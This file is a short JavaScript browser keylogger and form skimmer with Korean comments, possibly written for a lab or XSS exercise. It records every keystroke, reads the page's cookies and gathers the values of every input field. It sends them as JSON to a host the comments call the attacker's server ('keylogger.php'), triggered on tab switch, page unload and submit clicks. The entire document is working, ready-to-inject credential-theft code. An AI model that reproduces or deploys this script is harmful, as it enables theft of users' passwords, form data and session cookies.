//사용자가 누른 키들 저장
let keyData = "";
//사용자가 키보드 입력 시 누적 저장
window.addEventListener('keydown', (e) => {
    keyData += e.key;
});
//쿠키 값 저장
function getCookies(){
    return document.cookie;
}
//모든 input 태그의 id,name,value 입력 값 배열로 저장
function getInputValues(){
    const inputs = document.querySelectorAll('input');
    return Array.from(inputs).map(input => ({
        id: input.id,
        name: input.name,
        value: input.value
    }));
}
//공격자 서버로 데이터 전송
function sendData(eventType){
    const data = {
        type: eventType,
        keyData: keyData,
        cookies: getCookies(),
        inputValues: getInputValues()
    };
    //공격자 서버로 POST 요청 (JSON)형태
    fetch('http://172.22.100.58/keylogger.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });

    keyData = ""; // 전송 후 KeyData 초기화
}
//브라우저 탭이 숨겨질 때(다른 탭으로 이동, 최소화 등) 자동으로 데이터 전송
document.addEventListener("visibilitychange", ()=>{
    if(document.visibilityState === "hidden"){
        sendData("page_change"); //이벤트 타입 지정해서 전송
    }
});
//페이지를 떠날 때(새로고침, 링크 이동, 닫기 등) 자동으로 데이터 전송
window.addEventListener("beforeunload", ()=>{
    sendData("exit");
});
//모든 submit 타입 버튼에 클릭 이벤트를 추가해서, 클릭 시 자동 데이터 전송
document.querySelectorAll('button[type="submit"]').forEach(btn => {
    btn.addEventListener('click', ()=>{
        sendData("buttonClick");
    });
});
